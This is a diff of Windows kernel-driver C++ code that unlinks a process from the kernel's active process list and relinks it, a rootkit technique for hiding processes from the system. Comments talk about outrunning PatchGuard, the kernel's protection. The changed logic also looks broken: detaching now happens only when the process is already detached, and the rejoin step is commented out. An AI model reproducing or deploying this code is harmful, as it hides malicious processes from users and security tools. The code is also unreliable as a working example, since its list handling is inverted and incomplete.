@@ -168,48 +168,38 @@ namespace eprocess
 
 	void ProcInfo::DetachFromProcessList()
 	{
-		if (kEprocessMutex.Trylock() != true)
-		{
-			return;
-		}
+		kEprocessMutex.Lock();
 		if (IsDetached())
 		{
-			return;
+			// What ever you do, the value-assign must be as quick as possible or PatchGuard come and BSOD :)))
+			PLIST_ENTRY cur = GetActiveProcessLinks();
+			RemoveEntryList(cur);
+			SetPrevEntryProc(cur);
+			SetNextEntryProc(cur);
 		}
-		// What ever you do, the value-assign must be as quick as possible or PatchGuard come and BSOD :)))
-		PLIST_ENTRY cur = GetActiveProcessLinks();
-		RemoveEntryList(cur);
-		SetPrevEntryProc(cur);
-		SetNextEntryProc(cur);
-
 		kEprocessMutex.Unlock();
 	}
 
 	void ProcInfo::JoinToProcessList()
 	{
-		if (kEprocessMutex.Trylock() != true)
+		kEprocessMutex.Lock();
+		if (IsDetached())
 		{
-			return;
+			// What if SYSTEM_PROCESS_ID is detached? We will have to use ZwQueryObject or PsLookupProcessByProcessId to find a process that is not detached
+			ProcInfo proc(ProcInfo(ProcInfo(SYSTEM_PROCESS_ID).GetPrevProc()).GetPrevProc());
+			ProcInfo next_proc(proc.GetNextProc());
+			PLIST_ENTRY cur = GetActiveProcessLinks();
+			PLIST_ENTRY prev = proc.GetActiveProcessLinks();
+			PLIST_ENTRY next = prev->Flink;
+			// What ever you do, the value-assign must be as quick as possible or PatchGuard come and BSOD :)))
+			//InsertTailList(prev, cur);
+			/*
+			cur->Blink = prev;
+			cur->Flink = next;
+			prev->Flink = cur;
+			next->Blink = cur;
+			*/
 		}
-		if (!IsDetached())
-		{
-			return;
-		}
-
-		// What if SYSTEM_PROCESS_ID is detached? We will have to use ZwQueryObject or PsLookupProcessByProcessId to find a process that is not detached
-		ProcInfo proc(ProcInfo(ProcInfo(SYSTEM_PROCESS_ID).GetPrevProc()).GetPrevProc());
-		ProcInfo next_proc(proc.GetNextProc());
-		PLIST_ENTRY cur = GetActiveProcessLinks();
-		PLIST_ENTRY prev = proc.GetActiveProcessLinks();
-		PLIST_ENTRY next = prev->Flink;
-		// What ever you do, the value-assign must be as quick as possible or PatchGuard come and BSOD :)))
-		//InsertTailList(prev, cur);
-		/*
-		cur->Blink = prev;
-		cur->Flink = next;
-		prev->Flink = cur;
-		next->Blink = cur;
-		*/
 		kEprocessMutex.Unlock();
 	}
 
